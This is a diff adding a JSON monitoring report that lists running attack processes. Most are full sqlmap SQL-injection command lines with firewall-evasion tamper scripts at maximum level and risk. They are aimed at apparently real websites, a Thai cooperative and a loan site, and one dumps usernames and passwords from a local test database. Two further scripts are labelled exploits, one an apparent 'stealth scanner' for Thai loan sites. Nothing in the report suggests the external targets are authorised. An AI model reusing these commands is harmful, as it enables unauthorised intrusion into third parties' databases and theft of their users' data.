@@ -1,0 +1,55 @@
+{
+  "report_time": "2025-10-29T04:22:01.297440",
+  "monitoring_status": "Active",
+  "statistics": {
+    "active_attacks": 0,
+    "total_alerts": 0,
+    "total_processes": 6
+  },
+  "recent_successes": [],
+  "vulnerability_alerts": [],
+  "monitored_processes": [
+    {
+      "pid": 21312,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u https://peacoop.or.th/members?id=1 -p id --batch --level=5 --risk=3 --random-agent --tamper=space2comment,randomcase,charencode,between,modsecurityversioned --fresh-queries --time-sec=10 --threads=5 --banner --current-db --dbs",
+      "target": "https://peacoop.or.th/members?id=1",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 36652,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u https://ngoenmun.com/search?q=test -p q --batch --level=5 --risk=3 --random-agent --tamper=space2comment,randomcase,charencode,between,modsecurityversioned --fresh-queries --time-sec=10 --threads=5 --banner --current-db --dbs",
+      "target": "https://ngoenmun.com/search?q=test",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 49660,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u https://ngoenmun.com/loan-application?id=1 -p id --batch --level=5 --risk=3 --random-agent --tamper=space2comment,randomcase,charencode,between,modsecurityversioned --fresh-queries --time-sec=20 --threads=10 --banner --current-db --dbs --tables",
+      "target": "https://ngoenmun.com/loan-application?id=1",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 54656,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u http://127.0.0.1:5000/user?id=1 -p id --batch --level=1 --risk=1 --fresh-queries --banner --current-db --tables --dump -D testdb -T users -C id,username,password --limit=3",
+      "target": "http://127.0.0.1:5000/user?id=1",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 27232,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe mcp_penetration_server.py",
+      "target": "mcp_penetration_server.py",
+      "type": "Python Exploit",
+      "status": "Running"
+    },
+    {
+      "pid": 64812,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe thai_loan_stealth_scanner_fixed.py",
+      "target": "thai_loan_stealth_scanner_fixed.py",
+      "type": "Python Exploit",
+      "status": "Running"
+    }
+  ]
+}
